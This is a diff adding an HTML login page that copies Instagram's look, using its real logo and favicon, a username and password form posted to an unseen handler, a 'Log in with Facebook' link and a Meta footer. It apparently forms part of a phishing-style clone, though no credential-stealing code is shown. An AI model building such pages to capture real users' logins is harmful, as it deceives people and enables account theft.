@@ -1,0 +1,39 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" class="logo" alt="Instagram Logo" />
+      
+      <form id="login-form" onsubmit="handleLogin(event)">
+        <input type="text" id="username" placeholder="Phone number, username, or email" />
+        <input type="password" id="password" placeholder="Password" />
+        <button type="submit">Log In</button>
+      </form>
+
+      <div class="or-line"><span>OR</span></div>
+      
+      <a href="fb-login.html" class="fb-login">Log in with Facebook</a>
+      <a href="#" class="forgot">Forgot password?</a>
+    </div>
+
+    <div class="signup-box">
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+
+    <footer>
+      <p>Meta © 2025</p>
+    </footer>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
